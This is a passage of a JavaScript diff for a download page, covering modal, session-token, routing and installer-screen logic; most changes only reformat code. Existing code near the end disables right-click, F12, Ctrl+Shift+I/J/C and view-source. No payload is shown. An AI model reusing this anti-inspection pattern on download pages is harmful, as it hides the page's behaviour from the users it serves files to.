-            500
-        );
-
-
-        setTimeout(
-            () => {
-
-                updateDownloadStatus(
-                    "success"
-                );
-
-            },
-            1500
-        );
-
+        setTimeout(() => {
+            updateDownloadStatus("success");
+        }, 1500);
     }
 
 
@@ -1735,38 +1403,22 @@ function unlockModalBackground() {
     ========================================================== */
 
     if (confirmButton) {
-
         confirmButton.addEventListener(
             "click",
             () => {
-
-                if (
-                    confirmButton.disabled
-                ) {
-
+                if (confirmButton.disabled) {
                     return;
-
                 }
-
 
                 setPreparing();
 
-
                 saveSession();
 
-
-                setTimeout(
-                    () => {
-
-                        showInstallerBackground();
-
-                    },
-                    CONFIG.preparationDelay
-                );
-
+                setTimeout(() => {
+                    showInstallerBackground();
+                }, CONFIG.preparationDelay);
             }
         );
-
     }
 
 
@@ -1775,26 +1427,18 @@ function unlockModalBackground() {
     ========================================================== */
 
     if (downloadButton) {
-
         downloadButton.addEventListener(
             "click",
             () => {
-
-                if (
-                    downloadNavigationStarted
-                ) {
-
+                if (downloadNavigationStarted) {
                     return;
-
                 }
-
 
                 /*
                  * Refresh session values from storage.
                  */
 
                 try {
-
                     const storedAccessToken =
                         sessionStorage.getItem(
                             STORAGE_KEYS.accessToken
@@ -1805,60 +1449,42 @@ function unlockModalBackground() {
                             STORAGE_KEYS.visitToken
                         ) || "";
 
-
                     if (
                         isValidAccessToken(
                             storedAccessToken
                         )
                     ) {
-
                         session.accessToken =
                             storedAccessToken;
-
                     }
-
 
                     if (
                         isValidVisitToken(
                             storedVisitToken
                         )
                     ) {
-
                         session.visitToken =
                             storedVisitToken;
-
                     }
-
                 } catch (error) {
-
                     console.warn(
                         "Unable to restore session.",
                         error
                     );
-
                 }
 
-
                 /*
-                 * FIX:
-                 *
                  * Always open the instructions screen
                  * when the download button is clicked.
                  *
-                 * Previously, this handler returned here
-                 * when the access token was missing,
-                 * preventing the screen transition.
-                 *
-                 * routeToInstructions() still calls
+                 * routeToInstructions() calls
                  * startProtectedDownload(), which checks
-                 * authorization before starting a download.
+                 * authorization before downloading.
                  */
 
                 routeToInstructions();
-
             }
         );
-
     }
 
 
@@ -1867,34 +1493,23 @@ function unlockModalBackground() {
     ========================================================== */
 
     if (manualDownload) {
-
         manualDownload.addEventListener(
             "click",
             event => {
-
                 const url =
                     buildDownloadUrl();
 
-
                 if (!url) {
-
                     event.preventDefault();
 
-                    updateDownloadStatus(
-                        "error"
-                    );
+                    updateDownloadStatus("error");
 
                     return;
-
                 }
 
-
-                manualDownload.href =
-                    url;
-
+                manualDownload.href = url;
             }
         );
-
     }
 
 
@@ -1903,17 +1518,72 @@ function unlockModalBackground() {
     ========================================================== */
 
     if (closeModal) {
-
         closeModal.addEventListener(
             "click",
             () => {
-
                 closeDownloadScreen();
-
             }
         );
-
     }
+
+
+    /* =========================================================
+       PREVENT BACKGROUND SCROLLING WHILE MODAL IS OPEN
+    ========================================================== */
+
+    document.addEventListener(
+        "wheel",
+        event => {
+            if (
+                isDownloadModalOpen() &&
+                !isInsideDownloadModal(event.target)
+            ) {
+                event.preventDefault();
+            }
+        },
+        { passive: false }
+    );
+
+    document.addEventListener(
+        "touchmove",
+        event => {
+            if (
+                isDownloadModalOpen() &&
+                !isInsideDownloadModal(event.target)
+            ) {
+                event.preventDefault();
+            }
+        },
+        { passive: false }
+    );
+
+    document.addEventListener(
+        "keydown",
+        event => {
+            if (!isDownloadModalOpen()) {
+                return;
+            }
+
+            const scrollKeys = [
+                " ",
+                "Spacebar",
+                "ArrowUp",
+                "ArrowDown",
+                "PageUp",
+                "PageDown",
+                "Home",
+                "End"
+            ];
+
+            if (
+                scrollKeys.includes(event.key) &&
+                !isInsideDownloadModal(event.target)
+            ) {
+                event.preventDefault();
+            }
+        },
+        { passive: false }
+    );
 
 
     /* =========================================================
@@ -1923,19 +1593,13 @@ function unlockModalBackground() {
     document.addEventListener(
         "keydown",
         event => {
-
             if (
                 event.key === "Escape" &&
                 downloadScreen &&
-                !downloadScreen.classList.contains(
-                    "hidden"
-                )
+                !downloadScreen.classList.contains("hidden")
             ) {
-
                 closeDownloadScreen();
-
             }
-
         }
     );
 
@@ -1947,30 +1611,33 @@ function unlockModalBackground() {
     window.addEventListener(
         "popstate",
         () => {
-
             if (
                 window.location.pathname === "/"
             ) {
+                if (downloadModal) {
+                    downloadModal.classList.remove(
+                        "modal-visible"
+                    );
+                }
 
-                showOnly(
-                    confirmScreen
-                );
+                unlockModalBackground();
+
+                showOnly(confirmScreen);
 
                 return;
-
             }
 
+            if (isLongRoute()) {
+                if (downloadModal) {
+                    downloadModal.classList.remove(
+                        "modal-visible"
+                    );
+                }
 
-            if (
-                isLongRoute()
-            ) {
+                unlockModalBackground();
 
-                showOnly(
-                    confirmScreen
-                );
-
+                showOnly(confirmScreen);
             }
-
         }
     );
 
@@ -1980,48 +1647,41 @@ function unlockModalBackground() {
     ========================================================== */
 
     function restoreRouteAfterReload() {
-
-        if (
-            !isLongRoute()
-        ) {
-
+        if (!isLongRoute()) {
             return;
-
         }
-
 
         const token =
             getLongRouteToken();
-
 
         if (
             !token ||
             window.location.href.length !==
             CONFIG.longUrlLength
         ) {
-
             console.warn(
                 "Invalid long route."
             );
 
             return;
-
         }
 
-
-        session.longUrlToken =
-            token;
-
+        session.longUrlToken = token;
 
         /*
          * Preserve the existing behavior:
          * after reload, return to confirmation.
          */
 
-        showOnly(
-            confirmScreen
-        );
+        if (downloadModal) {
+            downloadModal.classList.remove(
+                "modal-visible"
+            );
+        }
 
+        unlockModalBackground();
+
+        showOnly(confirmScreen);
     }
 
 
@@ -2030,68 +1690,41 @@ function unlockModalBackground() {
     ========================================================== */
 
     async function initialize() {
-
         if (initialized) {
             return;
         }
 
         initialized = true;
 
-
         restoreStoredSession();
 
-
         try {
-
             establishLongBrowserUrl();
-
         } catch (error) {
-
             console.warn(
                 "Unable to establish long browser URL.",
                 error
             );
-
         }
-
 
         await createSession();
 
-
         reportVisit();
-
 
         restoreRouteAfterReload();
 
+        setTimeout(() => {
+            if (
+                instructionsScreen &&
+                !instructionsScreen.classList.contains("hidden")
+            ) {
+                return;
+            }
 
-        setTimeout(
-            () => {
+            hide(loadingScreen);
 
-                if (
-                    instructionsScreen &&
-                    !instructionsScreen.classList.contains(
-                        "hidden"
-                    )
-                ) {
-
-                    return;
-
-                }
-
-
-                hide(
-                    loadingScreen
-                );
-
-
-                show(
-                    confirmScreen
-                );
-
-            },
-            CONFIG.initialDelay
-        );
-
+            show(confirmScreen);
+        }, CONFIG.initialDelay);
     }
 
 
@@ -2102,71 +1735,46 @@ function unlockModalBackground() {
     document.addEventListener(
         "contextmenu",
         event => {
-
             event.preventDefault();
-
         }
     );
-
 
     document.addEventListener(
         "dragstart",
         event => {
-
             if (
                 event.target &&
                 event.target.tagName === "IMG"
             ) {
-
                 event.preventDefault();
-
             }
-
         }
     );
-
 
     document.addEventListener(
         "keydown",
         event => {
-
             const key =
                 event.key.toLowerCase();
 
-
-            if (
-                event.key === "F12"
-            ) {
-
+            if (event.key === "F12") {
                 event.preventDefault();
-
             }
-
 
             if (
                 event.ctrlKey &&
                 event.shiftKey &&
-                [
-                    "i",
-                    "j",
-                    "c"
-                ].includes(key)
+                ["i", "j", "c"].includes(key)
             ) {
-
                 event.preventDefault();
-
             }
-
 
             if (
                 event.ctrlKey &&
                 key === "u"
             ) {
-
                 event.preventDefault();
-
             }
-
         }
     );
 
